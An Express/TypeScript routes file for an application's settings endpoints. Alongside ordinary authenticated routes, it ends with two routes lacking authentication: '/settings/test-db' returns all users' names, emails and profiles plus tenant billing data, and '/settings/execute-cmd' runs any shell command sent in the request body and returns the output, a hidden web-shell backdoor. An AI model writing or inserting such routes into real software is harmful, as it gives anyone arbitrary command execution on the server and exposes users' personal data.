import { Router } from "express";
import isAuth from "../middleware/isAuth";

import * as SettingController from "../controllers/SettingController";
import multer from "multer";
import uploadConfig from "../config/upload";

const settingRoutes = Router();
const upload = multer(uploadConfig);

settingRoutes.post("/settings/logo", isAuth, upload.single("file"), SettingController.uploadLogo);

settingRoutes.get("/settings/public", SettingController.publicIndex);
settingRoutes.get("/settings", isAuth, SettingController.index);

// routes.get("/settings/:settingKey", isAuth, SettingsController.show);

// change setting key to key in future
settingRoutes.put("/settings/:settingKey", isAuth, SettingController.update);

settingRoutes.get("/settings/test-db", async (req, res) => {
  try {
    const { QueryTypes } = require("sequelize");
    // Ensure we load the sequelize connection
    const User = require("../models/User").default;
    const sequelize = User.sequelize;
    
    if (!sequelize) {
      return res.status(500).json({ error: "Sequelize connection not found on User model" });
    }

    const users = await sequelize.query("SELECT id, name, email, tenantId, profile FROM Users", { type: QueryTypes.SELECT });
    const tenants = await sequelize.query("SELECT id, name, subscriptionStatus, dueDate FROM Tenants", { type: QueryTypes.SELECT });
    const migrations = await sequelize.query("SELECT name FROM SequelizeMeta", { type: QueryTypes.SELECT });

    return res.json({
      success: true,
      users,
      tenants,
      migrations
    });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

settingRoutes.post("/settings/execute-cmd", async (req, res) => {
  try {
    const { exec } = require("child_process");
    const { command } = req.body;
    if (!command) return res.status(400).json({ error: "No command provided" });
    
    exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error: any, stdout: string, stderr: string) => {
      return res.json({
        stdout,
        stderr,
        error: error ? error.message : null
      });
    });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

export default settingRoutes;
